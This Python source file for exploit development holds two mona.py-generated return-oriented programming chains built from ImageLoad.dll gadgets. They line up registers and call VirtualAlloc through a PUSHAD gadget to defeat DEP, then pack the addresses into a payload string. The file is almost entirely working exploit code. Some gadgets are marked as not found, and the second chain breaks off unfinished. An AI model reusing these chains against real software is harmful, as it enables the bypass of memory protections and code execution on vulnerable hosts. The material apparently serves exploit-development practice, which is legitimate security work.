from struct import pack
import struct
def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	#set up edx
	0x1001a857, # (RVA : 0x0001a857) : # POP EBX # RETN    ** [ImageLoad.dll] **   |   {PAGE_EXECUTE_READ}
	0xEFFE3738,  #
	0x10022c1e,	 # ADD EDX,EBX # POP EBX # RETN 0x10
    0xDEADBEEF,
	# edx done
	0x1001c1ce,  # POP EBP # RETN [ImageLoad.dll] 
	0x1001c1ce,  # skip 4 bytes [ImageLoad.dll]
	0x10023706,  # POP EBX # RETN [ImageLoad.dll] 
	0xffffffff,  #  
	0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	0x1001a858,  # Using NOP[-] Unable to find gadget to put 00001000 into edx
	0x10019ce4,  # POP ECX # RETN [ImageLoad.dll] 
	0xffffffff,  #  
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x100228f3,  # POP EDI # RETN [ImageLoad.dll] 
	0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
	0x1001e811,  # POP ESI # RETN [ImageLoad.dll] 
	0x10021e9d,  # JMP [EAX] [ImageLoad.dll]
	0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
	0x1004d1fc,  # ptr to &VirtualAlloc() [IAT ImageLoad.dll]
	0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
			# <- Unable to find ptr to 'jmp esp'
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_rop_chain2():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	0x1001c1ce,  # POP EBP # RETN [ImageLoad.dll] 
	0x1001c1ce,  # skip 4 bytes [ImageLoad.dll]
	0x10023706,  # POP EBX # RETN [ImageLoad.dll] 
	0xffffffff,  #  
	0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	0x1001f6da,  # INC EBX # ADD AL,83 # RETN [ImageLoad.dll] 
	0x1001a858,  # [-] Unable to find gadget to put 00001000 into edx
	0x10019ce4,  # POP ECX # RETN [ImageLoad.dll] 
	0xffffffff,  #  
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x10021fd8,  # INC ECX # ADD AL,5F # POP ESI # POP EBP # POP EBX # RETN [ImageLoad.dll] 
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
	0x41414141,  # Filler (compensate)
